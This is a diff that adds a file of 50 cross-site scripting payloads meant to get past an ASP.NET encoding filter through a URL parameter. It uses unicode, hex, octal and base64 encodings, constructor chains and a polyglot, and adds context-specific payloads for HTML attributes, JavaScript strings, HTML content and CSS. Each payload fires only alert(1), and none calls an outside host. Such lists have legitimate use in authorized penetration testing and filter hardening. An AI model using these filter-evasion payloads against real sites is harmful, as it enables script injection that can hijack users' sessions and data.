@@ -1,0 +1,173 @@
+// 50 XSS Payloads for ASP.NET Encoding Filter Bypass
+// Test each one in your URL parameter
+
+// 1. Unicode JavaScript scheme
+javascript:\u0061lert(1)
+
+// 2. Base64 Data URL
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+
+// 3. String.fromCharCode construction
+javascript:alert(String.fromCharCode(49))
+
+// 4. Full Unicode encoding
+\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:\u0061\u006c\u0065\u0072\u0074(1)
+
+// 5. Mixed case + unicode
+jAvAsCrIpT:\u0061lert(1)
+
+// 6. HTML entity encoding
+javascript:alert&#x28;1&#x29;
+
+// 7. Octal escape sequences
+javascript:\141lert(1)
+
+// 8. Hex escape sequences
+javascript:\x61lert(1)
+
+// 9. Constructor method
+javascript:[].constructor.constructor('alert(1)')()
+
+// 10. String concatenation
+javascript:window['al'+'ert'](1)
+
+// 11. Comment bypass
+javascript:/**/alert(1)
+
+// 12. Double URL encoding
+%6a%61%76%61%73%63%72%69%70%74%3aalert(1)
+
+// 13. VBScript alternative
+vbscript:msgbox(1)
+
+// 14. Data URL with script
+data:text/html,<script>alert(1)</script>
+
+// 15. HTML comments in JS
+javascript:<!--//-->alert(1)
+
+// 16. Null byte truncation
+javascript:alert(1)%00
+
+// 17. Hex number
+javascript:alert(0x1)
+
+// 18. Location redirect
+javascript:location.href='data:text/html,<script>alert(1)</script>'
+
+// 19. Eval with string
+javascript:eval('alert(1)')
+
+// 20. setTimeout method
+javascript:setTimeout('alert(1)',0)
+
+// 21. Multiple unicode escapes
+javascript:\u0061\u006c\u0065\u0072\u0074(1)
+
+// 22. Template literals
+javascript:`${alert`1`}`
+
+// 23. Function constructor
+javascript:Function('alert(1)')()
+
+// 24. Global object access
+javascript:this['alert'](1)
+
+// 25. Window property
+javascript:window['alert'](1)
+
+// 26. Encoded colon
+javascript%3aalert(1)
+
+// 27. Double colon encoding
+javascript&#58;alert(1)
+
+// 28. Mixed encoding
+javascript:\u003aalert(1)
+
+// 29. Array access
+javascript:top['alert'](1)
+
+// 30. Parentheses alternatives
+javascript:alert`1`
+
+// 31. Mathematical eval
+javascript:alert(1+0)
+
+// 32. Bitwise operation
+javascript:alert(1|0)
+
+// 33. String splitting
+javascript:alert('1'.split('')[0])
+
+// 34. Character code array
+javascript:alert([1][0])
+
+// 35. Object property
+javascript:({a:alert})[String.fromCharCode(97)](1)
+
+// 36. Proto chain
+javascript:[].__proto__.constructor.constructor('alert(1)')()
+
+// 37. Unicode normalization
+javascript:\u{61}lert(1)
+
+// 38. Escaped quotes in data URL
+data:text/html,<script>alert\x281\x29</script>
+
+// 39. Multiple slashes
+javascript://alert(1)
+
+// 40. Line feed injection
+javascript:alert(1)%0a
+
+// 41. Carriage return
+javascript:alert(1)%0d
+
+// 42. Tab character
+javascript:alert(1)%09
+
+// 43. Form feed
+javascript:alert(1)%0c
+
+// 44. Vertical tab
+javascript:alert(1)%0b
+
+// 45. Non-breaking space
+javascript:alert(1)%a0
+
+// 46. Zero width space
+javascript:alert(1)%e2%80%8b
+
+// 47. Encoded alert function
+javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029
+
+// 48. Recursive encoding
+%6a%61%76%61%73%63%72%69%70%74%3a%61%6c%65%72%74%28%31%29
+
+// 49. Mixed protocols
+data:text/javascript,alert(1)
+
+// 50. Polyglot approach
+javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>
+
+// CONTEXT-SPECIFIC PAYLOADS (if parameter appears in different contexts):
+
+// HTML Attribute Context:
+" onmouseover="alert(1)" "
+' onmouseover='alert(1)' '
+onmouseover=alert(1)
+
+// JavaScript String Context:
+'; alert(1); //
+\'; alert(1); //
+"; alert(1); //
+
+// HTML Content Context:
+<img src=x onerror=alert(1)>
+<svg onload=alert(1)>
+<iframe src=javascript:alert(1)>
+
+// CSS Context:
+expression(alert(1))
+url('javascript:alert(1)')
